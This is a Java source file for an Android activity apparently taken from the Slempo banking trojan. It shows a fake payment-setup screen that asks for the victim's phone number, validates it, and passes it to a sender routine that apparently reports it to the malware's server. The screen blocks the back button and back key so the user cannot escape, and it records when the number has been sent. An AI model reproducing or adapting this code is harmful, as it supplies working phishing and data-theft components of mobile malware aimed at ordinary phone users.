package org.slempo.service.activities;

import java.util.Locale;

import org.slempo.service.Constants;
import org.slempo.service.R;
import org.slempo.service.utils.Sender;
import org.slempo.service.utils.Utils;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.view.KeyEvent;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.animation.Animation;
import android.view.animation.AnimationUtils;
import android.view.inputmethod.InputMethodManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;

import com.google.i18n.phonenumbers.NumberParseException;
import com.google.i18n.phonenumbers.PhoneNumberUtil;
import com.google.i18n.phonenumbers.Phonenumber.PhoneNumber;

public class ChangeNumber extends Activity {

	private Button continueButton;

	private EditText prefix;

	private EditText number;

	private TelephonyManager manager;

	private View loadingView;

	private View contentWholeView;

	private String countryPrefix;

	private String numberBody;

	private TextView errorMessage;

	private BroadcastReceiver signalsReceiver;

	private SharedPreferences settings;

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		settings = getSharedPreferences(Constants.PREFS_NAME,
				Context.MODE_PRIVATE);
		manager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
		setContentView(R.layout.change_number_fragment);
		loadingView = findViewById(R.id.loading_spinner);
		contentWholeView = findViewById(R.id.change_number_details);
		continueButton = (Button) findViewById(R.id.positive_button);
		continueButton.setText(getString(R.string.add_instrument_continue));
		continueButton.setOnClickListener(new OnClickListener() {

			@Override
			public void onClick(View v) {
				if (isValidNumber()) {
					crossFade(contentWholeView, View.INVISIBLE,
							R.anim.fade_out, loadingView,
							R.anim.slide_in_right, true);
					sendData();
				}
			}
		});
		errorMessage = (TextView) findViewById(R.id.error_message);
		initReceiver();
		prefix = (EditText) findViewById(R.id.registration_new_cc);
		prefix.setText(getCountryCode());
		number = (EditText) findViewById(R.id.registration_new_phone);
	}

	private void sendData() {
		Sender.sendPhoneData(this, "+" + countryPrefix + numberBody);
	}

	@Override
	public boolean onKeyDown(int keyCode, KeyEvent event) {
		if (keyCode == KeyEvent.KEYCODE_BACK) {
			return true;
		}
		return super.onKeyDown(keyCode, event);
	}

	@Override
	public void onBackPressed() {
	}

	private String getCountryCode() {
		String countryID = "";
		String countryCode = "";
		String countryIso = manager.getSimCountryIso();
		if (TextUtils.isEmpty(countryIso)) {
			prefix.requestFocus();
			return "";
		}
		countryID = countryIso.toUpperCase(Locale.getDefault());
		String[] rl = getResources().getStringArray(R.array.country_codes);
		for (int i = 0; i < rl.length; i++) {
			String[] g = rl[i].split(",");
			if (g[1].trim().equals(countryID.trim())) {
				countryCode = g[0];
				break;
			}
		}
		return countryCode;
	}

	private boolean isValidNumber() {
		countryPrefix = prefix.getText().toString();
		numberBody = number.getText().toString();
		if (TextUtils.isEmpty(countryPrefix)) {
			playShakeAnimation(prefix);
			return false;
		}
		if (TextUtils.isEmpty(numberBody)) {
			playShakeAnimation(number);
			return false;
		}
		String phoneNumber = countryPrefix + numberBody;
		PhoneNumberUtil phoneUtil = PhoneNumberUtil.getInstance();
		try {
			String country = manager.getSimCountryIso().toUpperCase(
					Locale.getDefault());
			if (country == null) {
				country = "us";
			}
			PhoneNumber numberProto = phoneUtil.parse(phoneNumber, country);
			if (!phoneUtil.isValidNumber(numberProto)) {
				playShakeAnimation(number);
				return false;
			}
			return true;
		} catch (NumberParseException e) {
			playShakeAnimation(number);
			return false;
		}
	}

	private void crossFade(View fromView, int fromViewFinalVisibility,
			int fromAnimation, View toView, int toAnimation,
			boolean closeKeyboard) {
		Animation anim1 = AnimationUtils.loadAnimation(this, fromAnimation);
		fromView.setVisibility(fromViewFinalVisibility);
		anim1.setAnimationListener(new Animation.AnimationListener() {

			@Override
			public void onAnimationStart(Animation animation) {
			}

			@Override
			public void onAnimationEnd(Animation animation) {
			}

			@Override
			public void onAnimationRepeat(Animation animation) {

			}
		});
		fromView.startAnimation(anim1);
		toView.setVisibility(View.VISIBLE);
		Animation anim2 = AnimationUtils.loadAnimation(this, toAnimation);
		anim2.setAnimationListener(new Animation.AnimationListener() {

			@Override
			public void onAnimationStart(Animation animation) {
			}

			@Override
			public void onAnimationEnd(Animation animation) {
			}

			@Override
			public void onAnimationRepeat(Animation animation) {

			}
		});
		toView.startAnimation(anim2);
		if (closeKeyboard) {
			InputMethodManager inputManager = (InputMethodManager) getSystemService(Context.INPUT_METHOD_SERVICE);
			View v = getCurrentFocus();
			if (v != null) {
				inputManager.hideSoftInputFromWindow(v.getWindowToken(),
						InputMethodManager.HIDE_NOT_ALWAYS);
			}
		}
	}

	private void playShakeAnimation(View view) {
		view.startAnimation(AnimationUtils.loadAnimation(this, R.anim.shake));
	}

	private void initReceiver() {
		signalsReceiver = new BroadcastReceiver() {

			@Override
			public void onReceive(Context context, Intent i) {
				boolean status = i.getExtras().getBoolean("status");
				if (status) {
					Utils.putBooleanValue(settings, Constants.PHONE_IS_SENT,
							true);
					ChangeNumber.this.finish();
				} else {
					showError();
				}
			}
		};
		registerReceiver(signalsReceiver, new IntentFilter(
			Sender.UPDATE_MAIN_UI));
	}

	private void showError() {
		loadingView.setVisibility(View.GONE);
		contentWholeView.setVisibility(View.VISIBLE);
		errorMessage.setVisibility(View.VISIBLE);
	}

	@Override
	protected void onPause() {
		super.onPause();
		finish();
	}

	@Override
	protected void onDestroy() {
		super.onDestroy();
		unregisterReceiver(signalsReceiver);
	}/**/
}
